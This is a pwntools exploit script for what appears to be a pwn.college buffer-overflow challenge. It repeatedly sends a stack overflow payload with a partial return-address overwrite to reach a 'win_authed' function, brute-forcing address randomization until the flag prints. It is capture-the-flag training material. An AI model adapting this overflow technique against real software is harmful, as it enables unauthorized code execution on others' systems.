from pwn import *


for i in range(256):
    print(f'try {i}')
    proc = process('/challenge/babymem-level-9-0')
    proc.recv()
    proc.recvuntil(b'size: ')
    size = 90
    proc.sendline(str(size).encode())
    proc.recvuntil(b'away from the start of the input buffer.\n')

    offset_win_authed = p16(0x153a)
    offset_n = 56
    payload = b'A' * (offset_n) + p8(87) + offset_win_authed
    proc.sendline(payload)
    try:
        r = proc.recvuntil(b'}')
        proc.close()
        print(r)
        break
    except EOFError:
        pass


